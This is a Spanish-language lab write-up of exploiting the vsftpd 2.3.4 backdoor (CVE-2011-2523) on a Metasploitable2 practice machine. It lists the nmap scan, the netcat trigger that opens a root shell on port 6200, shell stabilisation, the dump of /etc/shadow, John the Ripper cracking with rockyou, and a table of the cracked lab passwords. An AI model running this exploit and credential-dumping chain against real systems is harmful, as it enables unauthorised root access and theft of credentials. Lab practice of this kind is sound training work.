Puerto: 21
Servicio y versión: vsftpd 2.3.4
Hallazgo: Anonymous FTP + backdoor conocido (CVE-2011-2523)
Investigación: searchsploit vsftpd 2.3.4 → unix/remote/49757.py
Explotación: trigger manual con nc (USER nergal:) + PASS pass), shell root en puerto 6200
Post-explotación:
  - TTY estabilizada con python -c 'import pty; pty.spawn("/bin/bash")'
  - /etc/shadow extraído, 6/7 hashes crackeados con john + rockyou
    (root NO crackeado — contraseña no está en rockyou.txt)
  - ifconfig: sin segunda interfaz, no hay pivoting posible en este host


# vsftpd 2.3.4 — Backdoor Command Execution (Metasploitable2)

## Resumen
Explotación del backdoor conocido en vsftpd 2.3.4, obtención de shell root,
extracción y cracking de credenciales, y verificación de superficie de pivoting.

## Objetivo
- Host: 10.0.2.3 (Metasploitable2)
- Atacante: Parrot Security OS (VM), red NAT/virbr0

---

## Fase 1 — Reconocimiento

### Comando
```bash
nmap -sV -sC 10.0.2.3
```

### Hallazgo relevante
21/tcp open ftp vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)


### Interpretación
- Servicio: vsftpd 2.3.4
- Versión con backdoor conocido, ampliamente documentado
- Facilidad: ALTA (exploit público, corre con solo la IP)
- Impacto: MÁXIMO (shell de root)
- CVE: CVE-2011-2523

---

## Fase 2 — Investigación del exploit

### Comando
```bash
searchsploit vsftpd 2.3.4
```

### Resultado

vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/17491.rb


### Revisión del código (antes de ejecutar)
```bash
searchsploit -x unix/remote/49757.py
```

**Mecanismo del backdoor:** al conectarse por FTP y enviar un nombre de
usuario que contiene el smiley `:)`, el servicio comprometido abre una
shell de sistema en el puerto 6200, sin requerir contraseña real.

```python
user="USER nergal:)"
password="PASS pass"
```

---

## Fase 3 — Explotación

### Intento 1: script automatizado
```bash
python3 /usr/share/exploitdb/exploits/unix/remote/49757.py 10.0.2.3
```
**Resultado:** `ConnectionRefusedError` en el puerto 6200 — falla conocida
del exploit por condición de carrera (el puerto tarda en levantarse / queda
ocupado tras un intento previo).

### Intento 2 (exitoso): disparo manual con netcat
Como `telnet` no estaba instalado en el Parrot, se replicó el trigger con `nc`.

**Terminal 1 — disparar el backdoor:**
```bash
nc 10.0.2.3 21
```

USER nergal:)
PASS pass


**Terminal 2 — conectar a la shell abierta:**
```bash
nc 10.0.2.3 6200
```

### Verificación de acceso
```bash
whoami
```

root


**Acceso root confirmado.**

---

## Fase 4 — Post-explotación

### Estabilización de la shell (TTY)
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
Resultado: prompt estable `root@metasploitable:/#`

### Extracción de credenciales
```bash
cat /etc/shadow
```
Archivo copiado manualmente a Parrot como `shadow_metasploitable.txt`.

### Cracking offline con John the Ripper
```bash
john --format=md5crypt shadow_metasploitable.txt
```
Resultado parcial (diccionario por defecto):

service (service)
postgres (postgres)
user (user)
msfadmin (msfadmin)
123456789 (klog)
batman (sys)


Hash de `root` no resuelto con diccionario por defecto → se probó con rockyou:
```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt shadow_metasploitable.txt
```
Resultado: `0g DONE` — la contraseña de `root` no está en rockyou.txt.
No crackeada por diccionario (acceso a root ya obtenido por vía de explotación,
no se requiere la contraseña real).

### Tabla final de credenciales obtenidas
| Usuario   | Contraseña |
|-----------|------------|
| msfadmin  | msfadmin   |
| postgres  | postgres   |
| user      | user       |
| service   | service    |
| klog      | 123456789  |
| sys       | batman     |
| root      | NO crackeada (no está en rockyou.txt) |

### Reconocimiento interno / Pivoting
```bash
ifconfig
```
Resultado: solo `eth0` (10.0.2.3) + loopback. **Sin segunda interfaz de red
→ no hay superficie de pivoting en este host.**

---

## Conclusión
- Vulnerabilidad explotada exitosamente: backdoor de vsftpd 2.3.4 (CVE-2011-2523)
- Acceso: root, vía explotación directa (no vía cracking de credenciales)
- 6 de 7 cuentas de usuario tienen contraseñas débiles/reutilizadas
- No hay rutas de pivoting disponibles desde este host
- Lección técnica: el exploit en Python (49757.py) puede fallar por timing;
  el mismo trigger reproducido manualmente con `nc` funciona igual de bien
  y permite diagnosticar el problema paso a paso
